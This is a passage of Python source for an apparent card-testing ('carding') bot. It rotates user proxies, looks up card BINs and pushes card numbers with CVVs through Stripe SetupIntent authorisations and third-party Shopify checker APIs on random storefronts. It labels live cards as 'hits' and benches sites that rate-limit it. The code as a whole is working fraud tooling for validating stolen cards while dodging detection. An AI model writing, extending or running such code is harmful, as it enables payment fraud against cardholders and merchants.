
def user_proxy_list(uid):
    with db() as c:
        return [r["proxy"] for r in c.execute(
            "SELECT proxy FROM user_proxies WHERE uid=? AND status='live' ORDER BY id", (uid,)).fetchall()]

def user_proxy_all(uid):
    with db() as c:
        return c.execute("SELECT * FROM user_proxies WHERE uid=? ORDER BY id DESC", (uid,)).fetchall()

def clear_user_proxies(uid):
    with db() as c: c.execute("DELETE FROM user_proxies WHERE uid=?", (uid,))

def remove_user_proxy(uid: int, proxy: str):
    with db() as c: c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, proxy))

def proxy_display(proxy: str) -> str:
    if "@" in proxy and "://" in proxy:
        try:
            scheme, rest = proxy.split("://", 1)
            if "@" in rest: return f"{scheme}://***:***@{rest.rsplit('@', 1)[1]}"
        except: pass
    return proxy[:60]

async def check_proxy_live(proxy: str) -> Dict[str, Any]:
    start = time.time()
    proxy_url = _proxy_to_url(proxy)
    try:
        is_socks = proxy_url.startswith(("socks5://", "socks5h://", "socks4://"))
        if is_socks:
            if not HAS_SOCKS: return {"ok": False, "latency": 0, "error": "aiohttp_socks missing"}
            connector = ProxyConnector.from_url(proxy_url)
        else:
            connector = aiohttp.TCPConnector(force_close=True, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            async with session.get(PROXY_TEST_URL,
                                   proxy=None if is_socks else proxy_url,
                                   timeout=aiohttp.ClientTimeout(total=PROXY_TEST_TIMEOUT)) as r:
                if r.status == 200:
                    txt = await r.text(errors="ignore")
                    if txt and any(c.isdigit() for c in txt):
                        return {"ok": True, "latency": round(time.time() - start, 2)}
                    return {"ok": False, "latency": round(time.time() - start, 2), "error": "bad body"}
                return {"ok": False, "latency": round(time.time() - start, 2), "error": f"HTTP {r.status}"}
    except asyncio.TimeoutError:
        return {"ok": False, "latency": round(time.time() - start, 2), "error": "Timeout"}
    except Exception as e:
        return {"ok": False, "latency": round(time.time() - start, 2), "error": _sanitize_err(str(e)[:80])}

async def check_proxy_hq(proxy: str) -> Dict[str, Any]:
    r = await check_proxy_live(proxy)
    return {"ok": r.get("ok"), "latency": r.get("latency", 0), "error": r.get("error", "")}

def parse_proxy_txt(raw: str) -> List[str]:
    if not raw: return []
    out, seen = [], set()
    for t in re.split(r"[\r\n,;\t]+", raw):
        t = t.strip()
        if len(t) < 6: continue
        n = normalize_proxy(t)
        if n and n not in seen: seen.add(n); out.append(n)
    return out

async def preflight_proxies(uid: int, proxies: List[str]) -> Dict[str, Any]:
    result = {"tested": 0, "live": [], "dead": [], "total": len(proxies), "latencies": {}}
    if not proxies: return result
    sem, lock = asyncio.Semaphore(PROXY_TEST_BATCH), asyncio.Lock()
    async def one(p: str):
        async with sem:
            res = await check_proxy_hq(p)
            async with lock:
                result["tested"] += 1
                if res.get("ok"):
                    result["live"].append(p); result["latencies"][p] = res.get("latency", 0)
                else:
                    result["dead"].append(p)
    await asyncio.gather(*(one(p) for p in proxies))
    if result["dead"]:
        with db() as c:
            for p in result["dead"]:
                c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, p))
    if result["live"]:
        now = datetime.now(timezone.utc).isoformat()
        with db() as c:
            for p in result["live"]:
                c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? WHERE uid=? AND proxy=?",
                          (result["latencies"].get(p, 0), now, uid, p))
    return result

async def add_proxies_bulk(uid: int, proxies: List[str]) -> Dict[str, Any]:
    result = {"added": 0, "live": 0, "dead": 0, "rejected": 0, "limit_hit": False,
              "total_parsed": len(proxies)}
    with db() as c:
        existing = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=?", (uid,)).fetchone()["n"]
    if existing >= LIVE_PROXY_LIMIT:
        result["limit_hit"] = True
        return result
    slots = LIVE_PROXY_LIMIT - existing
    new_proxies, seen_set = [], set()
    with db() as c:
        existing_set = {r["proxy"] for r in c.execute("SELECT proxy FROM user_proxies WHERE uid=?", (uid,)).fetchall()}
    for p in proxies:
        if len(new_proxies) >= slots: break
        if p in existing_set or p in seen_set:
            result["rejected"] += 1; continue
        new_proxies.append(p); seen_set.add(p)
    if not new_proxies: return result
    with db() as c:
        for p in new_proxies:
            c.execute("INSERT OR IGNORE INTO user_proxies(uid, proxy, status) VALUES (?, ?, 'unknown')", (uid, p))
    result["added"] = len(new_proxies)
    sem, results = asyncio.Semaphore(PROXY_TEST_BATCH), {}
    async def one(p):
        async with sem: results[p] = await check_proxy_hq(p)
    await asyncio.gather(*(one(p) for p in new_proxies))
    live_found, dead_found, to_delete = 0, 0, []
    now = datetime.now(timezone.utc).isoformat()
    with db() as c:
        current_live = c.execute("SELECT COUNT(*) as n FROM user_proxies WHERE uid=? AND status='live'", (uid,)).fetchone()["n"]
    for p in new_proxies:
        if results.get(p, {}).get("ok"):
            if current_live < LIVE_PROXY_LIMIT:
                current_live += 1; live_found += 1
                with db() as c:
                    c.execute("UPDATE user_proxies SET status='live', latency=?, checked_at=? WHERE uid=? AND proxy=?",
                              (results[p].get("latency", 0), now, uid, p))
            else:
                to_delete.append(p)
        else:
            dead_found += 1; to_delete.append(p)
    if to_delete:
        with db() as c:
            for p in to_delete:
                c.execute("DELETE FROM user_proxies WHERE uid=? AND proxy=?", (uid, p))
    result["live"], result["dead"] = live_found, dead_found
    return result

# ── IMPROVED BIN LOOKUP (multi-source fallback) ──────────────────────────────
async def lookup_bin(bin_number):
    """
    Multi-source BIN lookup:
      1. Local cache (7 day TTL)
      2. binlist.net (best data quality)
      3. binlist.io (fallback)
      4. HandyAPI (final fallback)
    """
    bin6 = (bin_number or "")[:6]
    if not bin6 or len(bin6) < 6 or not bin6.isdigit():
        return {"error": "invalid bin"}

    # 1. Cache (7 days)
    try:
        with db() as c:
            row = c.execute("SELECT data, ts FROM bin_cache WHERE bin=?", (bin6,)).fetchone()
            if row:
                try:
                    ts = datetime.fromisoformat(row["ts"])
                    if (datetime.now(timezone.utc) - ts) < timedelta(days=7):
                        cached = json.loads(row["data"])
                        if isinstance(cached, dict) and "error" not in cached:
                            return cached
                except: pass
    except: pass

    result = None

    # 2. binlist.net (preferred)
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=6)) as s:
            async with s.get(f"https://lookup.binlist.net/{bin6}",
                             headers={"Accept-Version": "3"}) as r:
                if r.status == 200:
                    d = await r.json()
                    result = {
                        "bin": bin6,
                        "Issuer": (d.get("bank") or {}).get("name") or "N/A",
                        "Country": {
                            "Name": (d.get("country") or {}).get("name") or "N/A",
                            "Code": (d.get("country") or {}).get("alpha2") or "",
                        },
                        "Type": (d.get("type") or "N/A").upper(),
                        "Scheme": (d.get("scheme") or "N/A").upper(),
                        "CardTier": (d.get("brand") or "N/A"),
                        "Level": (d.get("brand") or "N/A"),
                    }
    except: pass

    # 3. binlist.io fallback
    if not result:
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=6)) as s:
                async with s.get(f"https://binlist.io/lookup/{bin6}") as r:
                    if r.status == 200:
                        d = await r.json()
                        result = {
                            "bin": bin6,
                            "Issuer": d.get("bank", {}).get("name") if isinstance(d.get("bank"), dict) else "N/A",
                            "Country": {
                                "Name": d.get("country", {}).get("name") if isinstance(d.get("country"), dict) else "N/A",
                                "Code": d.get("country", {}).get("alpha2", "") if isinstance(d.get("country"), dict) else "",
                            },
                            "Type": str(d.get("type") or "N/A").upper(),
                            "Scheme": str(d.get("scheme") or "N/A").upper(),
                            "CardTier": str(d.get("brand") or "N/A"),
                            "Level": str(d.get("brand") or "N/A"),
                        }
        except: pass

    # 4. HandyAPI fallback
    if not result:
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as s:
                async with s.get(f"https://data.handyapi.com/bin/{bin6}") as r:
                    if r.status == 200:
                        d = await r.json()
                        if d.get("Status") == "SUCCESS":
                            result = {
                                "bin": bin6,
                                "Issuer": d.get("Issuer") or "N/A",
                                "Country": {
                                    "Name": (d.get("Country") or {}).get("Name") if isinstance(d.get("Country"), dict) else "N/A",
                                    "Code": (d.get("Country") or {}).get("A2") if isinstance(d.get("Country"), dict) else "",
                                },
                                "Type": str(d.get("Type") or "N/A").upper(),
                                "Scheme": str(d.get("Scheme") or "N/A").upper(),
                                "CardTier": str(d.get("CardTier") or "N/A"),
                                "Level": str(d.get("Level") or "N/A"),
                            }
        except: pass

    if not result:
        return {"error": "BIN not found across all APIs"}

    # Save to cache
    try:
        async with _get_write_lock():
            with db() as c:
                c.execute("INSERT OR REPLACE INTO bin_cache(bin, data, ts) VALUES (?,?,?)",
                          (bin6, json.dumps(result), datetime.now(timezone.utc).isoformat()))
    except: pass

    return result

# ── Response classification ─────────────────────────────────────────────────
CHARGED_KEYWORDS = ("ORDER_PLACED","ORDER_PAID","PAYMENT_SUCCESSFULL","PAYMENT_CAPTURED",
                    "PAYMENT_COMPLETED","PAYMENT_FULFILLED","CHARGED","SUCCESS")
SITE_ERROR_KEYWORDS = ("NO_PRODUCTS","PRODUCTS_NOT_FOUND","PAYMENTS_ZONE_NOT_FOUND","INVALID_SHOP",
                       "INVALID_PURCHASE_TYPE","REQUIRED_ARTIFACTS_UNAVAILABLE","SUBSCRIPTION_REQUIRED",
                       "SITE ERROR","CART FAILED","NO PRODUCT","SITE_REQUIRED","NO_SITE","SITE_MISSING",
                       "INVALID_SITE","APPLICATION NOT FOUND","APP NOT FOUND","404 NOT FOUND",
                       "INTERNAL SERVER ERROR","BAD GATEWAY","NOT FOUND")
NSF_KEYWORDS = ("INSUFFICIENT_FUNDS","NSF","INSUFFICIENT FUNDS")
CCN_KEYWORDS = ("INCORRECT_CVC","INVALID_CVC","CVV","WRONG_CVV","INCORRECT_ZIP","SECURITY CODE")
THREE_DS_KEYWORDS = ("3DS","3D_SECURE","3D SECURE","AUTHENTICATION_REQUIRED","OTP_REQUIRED","OTP")
DECLINE_KEYWORDS = ("DECLINED","DECLINE","DO_NOT_HONOR","DO_NOT_HONOUR","DO NOT HONOR",
                    "GENERIC_DECLINE","INVALID_ACCOUNT","INVALID_NUMBER","INVALID_CARD",
                    "INCORRECT_NUMBER","CARD_NOT_ACTIVE","INACTIVE_CARD","FRAUDULENT",
                    "SUSPECTED_FRAUD","STOLEN_CARD","LOST_CARD","PICKUP_CARD","CALL_ISSUER",
                    "CONTACT_ISSUER","EXPIRED_CARD","CARD_EXPIRED","RESTRICTED_CARD",
                    "CARD_NOT_SUPPORTED","UNSUPPORTED_CARD","TRANSACTION_NOT_ALLOWED",
                    "NOT_PERMITTED","NOT_ALLOWED","BIN_BLOCKED","BLOCKED_CARD",
                    "AUTHENTICATION_FAILED","AUTHORIZATION_FAILED")
PROXY_ERROR_KEYWORDS = ("PROXY ERROR","CANNOT CONNECT","CONNECTION REFUSED",
                        "TUNNEL CONNECTION FAILED","407 PROXY AUTH","PROXY AUTH",
                        "PROXY DEAD","FAILED TO CONNECT","CONNECT CALL FAILED")
WORKING_SITE_CLASSES = ("declined", "charged", "approved", "approved_nsf",
                        "approved_ccn", "approved_3ds")

def _contains_any(upper_text: str, keywords) -> bool:
    return any(k in upper_text for k in keywords)

def parse_response(text: str, http_status: int = 200) -> Dict[str, Any]:
    raw_text = text or ""
    full_upper = raw_text.upper()
    if http_status == 429 or "RATE LIMIT" in full_upper or "TOO MANY" in full_upper:
        return {"cls": "rate_limited", "response": "rate_limited", "raw": raw_text[:500],
                "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    if http_status >= 500:
        return {"cls": "site_error", "response": f"HTTP {http_status}", "raw": raw_text[:500],
                "amount": 0.0, "currency": "USD", "gateway": "Shopify", "check_time": ""}
    data = {}
    s = raw_text.strip()
    if s.startswith(("{", "[")):
        try:
            parsed = json.loads(s)
            if isinstance(parsed, list) and parsed and isinstance(parsed[0], dict):
                data = parsed[0]
            elif isinstance(parsed, dict):
                data = parsed
        except: pass
    charged_flag = str(data.get("Charged", "False")).strip().lower() == "true"
    approved_flag = str(data.get("Approved", "False")).strip().lower() == "true"
    resp_msg = str(data.get("Response", data.get("response",
                       data.get("message", data.get("error", "")))) or "").strip()
    gateway = str(data.get("Gate", data.get("Gateway", data.get("gateway", "Shopify"))) or "Shopify").strip()
    check_time = str(data.get("Time", data.get("time", "")) or "").strip()
    price_raw = str(data.get("Price", data.get("price", data.get("amount", "0"))) or "0")
    amount, currency, pp = 0.0, "USD", price_raw.strip().split()
    if pp:
        try: amount = float(pp[0].replace("?","0").replace("$",""))
        except: pass
        if len(pp) > 1 and pp[1].isalpha(): currency = pp[1].upper()
    if not resp_msg: resp_msg = raw_text.strip()[:200] or "unknown"
    ru, fu = resp_msg.upper(), full_upper
    if charged_flag or _contains_any(ru, CHARGED_KEYWORDS):
        cls = "charged"
    elif _contains_any(fu, PROXY_ERROR_KEYWORDS):
        cls = "proxy_error"
    elif _contains_any(ru, SITE_ERROR_KEYWORDS):
        cls = "site_error"
    elif _contains_any(ru, THREE_DS_KEYWORDS):
        cls = "approved_3ds"
    elif _contains_any(ru, NSF_KEYWORDS):
        cls = "approved_nsf"
    elif _contains_any(ru, CCN_KEYWORDS):
        cls = "approved_ccn"
    elif _contains_any(ru, DECLINE_KEYWORDS):
        cls = "declined"
    elif approved_flag:
        cls = "approved"
    else:
        cls = "declined"
    return {"cls": cls, "response": resp_msg[:200], "amount": amount, "currency": currency,
            "gateway": gateway, "check_time": check_time,
            "success": cls in ("charged","approved","approved_nsf","approved_ccn","approved_3ds"),
            "raw": raw_text[:500], "http": http_status}

def is_hit(cls):
    return cls in ("charged", "approved", "approved_nsf", "approved_ccn", "approved_3ds")
    # ── HTTP Sessions ────────────────────────────────────────────────────────────
_direct_http_session: Optional[aiohttp.ClientSession] = None
_proxy_http_session: Optional[aiohttp.ClientSession] = None

def direct_session() -> aiohttp.ClientSession:
    global _direct_http_session
    if _direct_http_session is None or _direct_http_session.closed:
        _direct_http_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(
                limit=5000, limit_per_host=5000, ttl_dns_cache=300,
                enable_cleanup_closed=True, ssl=False),
            timeout=aiohttp.ClientTimeout(
                total=CHECK_TIMEOUT, connect=PROXY_CONNECT_TIMEOUT,
                sock_read=PROXY_SOCK_READ_TIMEOUT))
    return _direct_http_session

def proxy_client_session() -> aiohttp.ClientSession:
    global _proxy_http_session
    if _proxy_http_session is None or _proxy_http_session.closed:
        _proxy_http_session = aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(
                limit=5000, limit_per_host=5000, force_close=True,
                ttl_dns_cache=300, enable_cleanup_closed=True, ssl=False),
            timeout=aiohttp.ClientTimeout(
                total=CHECK_TIMEOUT, connect=PROXY_CONNECT_TIMEOUT,
                sock_read=PROXY_SOCK_READ_TIMEOUT))
    return _proxy_http_session

def _proxy_exc(e):
    return any(k in str(e).upper() for k in
               ("PROXY","TUNNEL","407","CANNOT CONNECT","CONNECTION REFUSED","CONNECT CALL FAILED"))

# ── STRIPE AUTH (real, working) ──────────────────────────────────────────────
async def call_stripe_api(cc: str, proxy: Optional[str] = None) -> dict:
    """Real Stripe auth: PaymentMethod → SetupIntent → classify."""
    EMPTY = {"amount": 0.0, "currency": "USD", "gateway": "Stripe", "check_time": ""}
    sk = (get_setting("stripe_sk", "") or "").strip()
    if not sk:
        return {"cls": "error",
                "response": "Stripe SK not set (Admin → Bot Settings → Stripe SK)",
                "raw": "", **EMPTY}

    try:
        num, mm, yy, cvv = cc.split("|")
    except Exception:
        return {"cls": "error", "response": "bad cc format", "raw": "", **EMPTY}

    exp_year = yy if len(yy) == 4 else f"20{yy}"
    headers = {
        "Authorization": f"Bearer {sk}",
        "Content-Type": "application/x-www-form-urlencoded",
        "Stripe-Version": "2024-06-20",
    }
    ct = aiohttp.ClientTimeout(total=25, connect=PROXY_CONNECT_TIMEOUT, sock_read=25)
    proxy_url = proxy if proxy else None

    async def _post(url: str, data: dict):
        if proxy_url:
            is_socks = proxy_url.startswith(("socks5://", "socks5h://", "socks4://"))
            if is_socks:
                if not HAS_SOCKS:
                    return 0, "aiohttp_socks not installed"
                connector = ProxyConnector.from_url(proxy_url)
                async with aiohttp.ClientSession(connector=connector) as s:
                    async with s.post(url, data=data, headers=headers, timeout=ct) as r:
                        return r.status, await r.text(errors="ignore")
            else:
                async with proxy_client_session().post(
                        url, data=data, headers=headers, proxy=proxy_url, timeout=ct) as r:
                    return r.status, await r.text(errors="ignore")
        else:
            async with direct_session().post(
                    url, data=data, headers=headers, timeout=ct) as r:
                return r.status, await r.text(errors="ignore")

    try:
        # Step 1: PaymentMethod
        pm_payload = {
            "type": "card",
            "card[number]": num,
            "card[exp_month]": mm,
            "card[exp_year]": exp_year,
            "card[cvc]": cvv,
            "billing_details[address][postal_code]": "10001",
            "billing_details[address][country]": "US",
        }
        status, text = await _post("https://api.stripe.com/v1/payment_methods", pm_payload)
        try:
            data = json.loads(text) if text.strip().startswith("{") else {}
        except Exception:
            data = {}

        if status != 200 or not data.get("id"):
            err = data.get("error") or {}
            msg = str(err.get("message") or err.get("decline_code") or err.get("code") or text[:150])
            um = msg.upper()
            if any(k in um for k in ("INCORRECT_CVC","INVALID_CVC","CVC","CVV","SECURITY CODE")):
                cls = "approved_ccn"
            elif any(k in um for k in ("INSUFFICIENT","NSF")):
                cls = "approved_nsf"
            else:
                cls = "declined"
            return {"cls": cls, "response": _sanitize_err(msg)[:200],
                    "raw": text[:400], **EMPTY}

        # Step 2: SetupIntent (real $0 auth)
        pm_id = data["id"]
        si_payload = {
            "payment_method": pm_id,
            "confirm": "true",
            "usage": "off_session",
        }
        status2, text2 = await _post("https://api.stripe.com/v1/setup_intents", si_payload)
        try:
            data2 = json.loads(text2) if text2.strip().startswith("{") else {}
        except Exception:
            data2 = {}

        if status2 == 200 and data2.get("status") == "succeeded":
            return {"cls": "approved", "response": "CARD LIVE · AUTH OK",
                    "raw": text2[:400], **EMPTY}
        if status2 == 200 and data2.get("status") == "requires_action":
            return {"cls": "approved_3ds", "response": "3DS REQUIRED",
                    "raw": text2[:400], **EMPTY}

        err = data2.get("error") or {}
        msg = str(err.get("message") or err.get("decline_code") or err.get("code") or text2[:200])
        um = msg.upper()
        if any(k in um for k in ("INSUFFICIENT","NSF")): cls = "approved_nsf"
        elif any(k in um for k in ("INCORRECT_CVC","INVALID_CVC","CVC","CVV","SECURITY CODE")): cls = "approved_ccn"
        elif any(k in um for k in ("3D","AUTHENTICATION","OTP")): cls = "approved_3ds"
        elif any(k in um for k in ("PROXY","TIMEOUT","CONNECT")): cls = "proxy_error"
        else: cls = "declined"
        return {"cls": cls, "response": _sanitize_err(msg)[:200], "raw": text2[:400], **EMPTY}

    except asyncio.TimeoutError:
        return {"cls": "timeout", "response": "stripe timeout", "raw": "", **EMPTY}
    except Exception as e:
        return {"cls": "proxy_error" if _proxy_exc(e) else "error",
                "response": _sanitize_err(str(e))[:200], "raw": "", **EMPTY}

# ── Shopify API call (raw + legacy) ─────────────────────────────────────────
async def _call_new_api(url: str, proxy: Optional[str], uid: Optional[int],
                        timeout: float = 45.0) -> Dict[str, Any]:
    proxy_url = _proxy_to_url(proxy) if proxy else None
    is_socks = proxy_url and proxy_url.startswith(("socks5://","socks5h://","socks4://"))
    ct = aiohttp.ClientTimeout(
        total=timeout,
        connect=min(PROXY_CONNECT_TIMEOUT, timeout),
        sock_read=min(PROXY_SOCK_READ_TIMEOUT, timeout))
    try:
        if proxy:
            async with proxy_sem(proxy):
                if is_socks:
                    if not HAS_SOCKS:
                        return {"cls": "error", "response": "socks not installed",
                                "amount": 0.0, "currency": "USD", "gateway": "API",
                                "check_time": "", "raw": ""}
                    connector = ProxyConnector.from_url(proxy_url)
                    async with aiohttp.ClientSession(connector=connector) as s:
                        async with s.get(url, timeout=ct) as r:
                            text, status = await r.text(errors="ignore"), r.status
                else:
                    async with proxy_client_session().get(
                            url, proxy=proxy_url, timeout=ct) as r:
                        text, status = await r.text(errors="ignore"), r.status
            mark_proxy_ok(proxy)
        else:
            async with direct_session().get(url, timeout=ct) as r:
                text, status = await r.text(errors="ignore"), r.status
        res = parse_response(text, status)
        res["response"] = _sanitize_err(res.get("response", ""))
        return res
    except asyncio.TimeoutError:
        dropped = mark_proxy_fail(proxy) if proxy else False
        if dropped and uid is not None and proxy:
            remove_user_proxy(uid, proxy)
        return {"cls": "timeout", "response": "timeout", "raw": "",
                "amount": 0.0, "currency": "USD", "gateway": "API",
                "check_time": "", "_dropped": dropped}
    except Exception as e:
        is_pe = _proxy_exc(e)
        dropped = False
        if proxy and is_pe:
            dropped = mark_proxy_fail(proxy)
        if dropped and uid is not None and proxy:
            remove_user_proxy(uid, proxy)
        return {"cls": "proxy_error" if is_pe else "error",
                "response": _sanitize_err(str(e)), "raw": "",
                "amount": 0.0, "currency": "USD", "gateway": "API",
                "check_time": "", "_dropped": dropped}

def _build_api_request(ep: Dict[str, Any], cc: str, proxy: Optional[str],
                       site: Optional[str]):
    api_site = site if not site or site.startswith("http") else f"https://{site}"
    if ep.get("style", "params") == "raw":
        base, sep = ep["url"], "&" if "?" in ep["url"] else "?"
        parts = [urllib.parse.quote(cc, safe=""),
                 f"proxy={urllib.parse.quote(proxy or '', safe=':@')}"]
        if api_site:
            parts.append(f"site={urllib.parse.quote(api_site, safe=':/')}")
        if ep.get("key"):
            parts.append(f"key={urllib.parse.quote(str(ep['key']), safe='')}")
        return f"{base}{sep}{'&'.join(parts)}", None
    params = [("cc", cc), ("proxy", proxy or "")]
    if api_site: params.append(("site", api_site))
    if ep.get("key"): params.append(("key", str(ep["key"])))
    return ep["url"], params

async def _do_api_call(ep: Dict[str, Any], cc: str, proxy: Optional[str],
                       site: Optional[str], uid: Optional[int],
                       timeout: Optional[float]) -> Dict[str, Any]:
    url, params = _build_api_request(ep, cc, proxy, site)
    ep_url = ep["url"]
    ct = aiohttp.ClientTimeout(
        total=timeout or CHECK_TIMEOUT,
        connect=min(PROXY_CONNECT_TIMEOUT, timeout or CHECK_TIMEOUT),
        sock_read=min(PROXY_SOCK_READ_TIMEOUT, timeout or CHECK_TIMEOUT))
    proxy_url = _proxy_to_url(proxy) if proxy else None
    is_socks = proxy_url and proxy_url.startswith(("socks5://","socks5h://","socks4://"))
    try:
        if proxy:
            async with proxy_sem(proxy):
                if is_socks:
                    if not HAS_SOCKS:
                        return {"cls": "error", "response": "aiohttp_socks required",
                                "raw": "", "amount": 0.0, "currency": "USD",
                                "gateway": "Shopify", "check_time": ""}
                    connector = ProxyConnector.from_url(proxy_url)
                    async with aiohttp.ClientSession(connector=connector) as session:
                        async with session.get(url, params=params, timeout=ct) as r:
                            text, status = await r.text(errors="ignore"), r.status
                else:
                    async with proxy_client_session().get(
                            url, params=params, proxy=proxy_url, timeout=ct) as r:
                        text, status = await r.text(errors="ignore"), r.status
            mark_proxy_ok(proxy)
        else:
            async with direct_session().get(url, params=params, timeout=ct) as r:
                text, status = await r.text(errors="ignore"), r.status

        res = parse_response(text, status)
        res["response"] = _sanitize_err(res.get("response", ""))

        if res["cls"] == "site_error":
            mark_endpoint_fail(ep_url)
        else:
            mark_endpoint_ok(ep_url)

        if res["cls"] == "rate_limited":
            _bench_site(site or "", 180)
        elif res["cls"] == "proxy_error":
            dropped = mark_proxy_fail(proxy) if proxy else False
            if dropped and uid is not None and proxy:
                remove_user_proxy(uid, proxy)
            res["_dropped"] = dropped

        res.update({"_site": site or "", "_proxy": proxy, "_endpoint": ep_url})
        return res

    except asyncio.TimeoutError:
        mark_endpoint_fail(ep_url)
        dropped = mark_proxy_fail(proxy) if proxy else False
        if dropped and uid is not None and proxy:
            remove_user_proxy(uid, proxy)
        return {"cls": "timeout", "response": "timeout", "raw": "",
                "amount": 0.0, "currency": "USD", "gateway": "Shopify",
                "check_time": "", "_site": site or "", "_proxy": proxy,
                "_dropped": dropped, "_endpoint": ep_url}
    except Exception as e:
        is_proxy_err = _proxy_exc(e)
        dropped = False
        if proxy and is_proxy_err:
            dropped = mark_proxy_fail(proxy)
            if dropped and uid is not None:
                remove_user_proxy(uid, proxy)
        else:
            mark_endpoint_fail(ep_url)
        return {"cls": "proxy_error" if is_proxy_err else "error",
                "response": _sanitize_err(str(e)), "raw": "",
                "amount": 0.0, "currency": "USD", "gateway": "Shopify",
                "check_time": "", "_site": site or "", "_proxy": proxy,
                "_dropped": dropped, "_endpoint": ep_url}

async def _call_api_raw(cc: str, proxy: Optional[str] = None,
                        site: Optional[str] = None, uid: Optional[int] = None,
                        timeout: Optional[float] = None,
                        mode: str = "shopify", single: bool = False) -> Dict[str, Any]:
    t = timeout or CHECK_TIMEOUT
    cur_mode = get_setting("site_mode", "auto")
    last_res: Optional[Dict[str, Any]] = None

    if cur_mode in ("siteless", "auto"):
        for _ in range(2):
            api = pick_siteless_api()
            if not api: break
            url = build_siteless_url(api, cc, proxy)
            res = await _call_new_api(url, proxy, uid, t)
            last_res = res
            if res.get("cls") not in RETRYABLE_CLS:
                return res

    if cur_mode in ("with_site", "auto"):
        local_site = site
        for _ in range(2):
            api = pick_withsite_api()
            if not api: break
            if not local_site:
                sl = _pick_random_sites(1); local_site = sl[0] if sl else ""
            if not local_site: break
            await acquire_site_slot(local_site)
            url = build_withsite_url(api, cc, proxy, local_site)
            res = await _call_new_api(url, proxy, uid, t)
            last_res = res
            if res.get("cls") not in RETRYABLE_CLS:
                return res

    eps = _filtered_endpoints()
    if not eps:
        return last_res or {"cls": "error",
                            "response": f"no apis configured ({mode_label()})",
                            "raw": "", "amount": 0.0, "currency": "USD",
                            "gateway": "Shopify", "check_time": ""}

    if single:
        ep = next((e for e in eps if not is_endpoint_down(e["url"])), eps[0])
        need_site = ep.get("site_required", False)
        local_site = site
        if need_site and not local_site:
            sl = _pick_random_sites(1); local_site = sl[0] if sl else ""
        if need_site and not local_site:
            return last_res or {"cls": "site_error", "response": "no sites available",
                                "raw": "", "amount": 0.0, "currency": "USD",
                                "gateway": "Shopify", "check_time": ""}
        if need_site: await acquire_site_slot(local_site)
        return await _do_api_call(ep, cc, proxy,
                                  local_site if need_site else None, uid, timeout)

    healthy = [e for e in eps if not is_endpoint_down(e["url"])] or eps
    global _endpoint_rr
    with _endpoint_rr_lock:
        ep = healthy[_endpoint_rr % len(healthy)]
        _endpoint_rr += 1
    need_site = ep.get("site_required", False)
    local_site = site
    if need_site and not local_site:
        sl = _pick_random_sites(1); local_site = sl[0] if sl else ""
    if need_site and not local_site:
        return last_res or {"cls": "site_error", "response": "no sites available",
                            "raw": "", "amount": 0.0, "currency": "USD",
                            "gateway": "Shopify", "check_time": ""}
    if need_site: await acquire_site_slot(local_site)

    res = await _do_api_call(ep, cc, proxy,
                             local_site if need_site else None, uid, timeout)
    if res["cls"] in RETRYABLE_CLS and not res.get("_dropped") and len(eps) > 1:
        for fb_ep in eps:
            if fb_ep["url"] == ep["url"]: continue
            if is_endpoint_down(fb_ep["url"]): continue
            fb_need = fb_ep.get("site_required", False)
            if fb_need and not local_site:
                sl = _pick_random_sites(1); local_site = sl[0] if sl else ""
            res2 = await _do_api_call(fb_ep, cc, proxy,
                                      local_site if fb_need else None, uid, timeout)
            if res2["cls"] not in RETRYABLE_CLS:
                return res2
            res = res2
    return res

# ── MAIN ROUTER: shopify vs stripe ─────────────────────────────────────────
async def call_api(cc: str, proxy: Optional[str] = None, site: Optional[str] = None,
                   uid: Optional[int] = None, timeout: Optional[float] = None,
                   mode: str = "shopify", single: bool = False) -> Dict[str, Any]:
    try:
        if mode == "stripe":
            proxy_url = _proxy_to_url(proxy) if proxy else None
            r = await asyncio.wait_for(call_stripe_api(cc, proxy_url),
                                       timeout=timeout or 30.0)
        else:
            r = await asyncio.wait_for(
                _call_api_raw(cc, proxy, site, uid, timeout, mode, single),
                timeout=timeout or 90.0)
        if not r.get("response"):
            r["response"] = r.get("cls", "unknown")
        return r
    except asyncio.TimeoutError:
        return {"cls": "timeout", "response": "timeout",
                "raw": "", "amount": 0.0, "currency": "USD",
                "gateway": "Stripe" if mode == "stripe" else "Shopify",
                "check_time": ""}
    except Exception as e:
        return {"cls": "error", "response": _sanitize_err(str(e)) or "error",
                "raw": "", "amount": 0.0, "currency": "USD",
                "gateway": "Stripe" if mode == "stripe" else "Shopify",
                "check_time": ""}

# ── TEST SITE / BULK SITES (unchanged behaviour) ───────────────────────────
async def test_site(site: str, timeout: Optional[float] = None) -> Dict[str, Any]:
    t = timeout or 20.0
    site_full = site if site.startswith("http") else f"https://{site}"
    ct = aiohttp.ClientTimeout(total=t, connect=PROXY_CONNECT_TIMEOUT, sock_read=t)

    async def _fetch(url: str) -> Dict[str, Any]:
        try:
            async with direct_session().get(url, timeout=ct) as r:
                text = await r.text(errors="ignore")
                res = parse_response(text, r.status)
                res["response"] = _sanitize_err(res.get("response", ""))
                res["_site"] = site
                return res
        except asyncio.TimeoutError:
            return {"cls": "timeout", "response": "timeout", "raw": "",
                    "amount": 0.0, "currency": "USD", "gateway": "Shopify",
                    "check_time": "", "_site": site}
        except Exception as e:
            return {"cls": "error", "response": _sanitize_err(str(e)[:100]),
                    "raw": "", "amount": 0.0, "currency": "USD",
                    "gateway": "Shopify", "check_time": "", "_site": site}

    ws_api = pick_withsite_api()
    if ws_api:
        url = build_withsite_url(ws_api, DUMMY_CC, None, site_full)
        res = await _fetch(url)
        if res.get("cls") not in ("error", "timeout"):
            return res
        ws2 = pick_withsite_api()
        if ws2 and ws2["endpoint"] != ws_api["endpoint"]:
            res2 = await _fetch(build_withsite_url(ws2, DUMMY_CC, None, site_full))
            if res2.get("cls") not in ("error", "timeout"):
                return res2

    legacy = [ep for ep in load_api_state().get("endpoints", [])
              if ep.get("enabled", True) and ep.get("site_required", False)]
    if legacy:
        ep = legacy[0]
        url, params = _build_api_request(ep, DUMMY_CC, None, site_full)
        try:
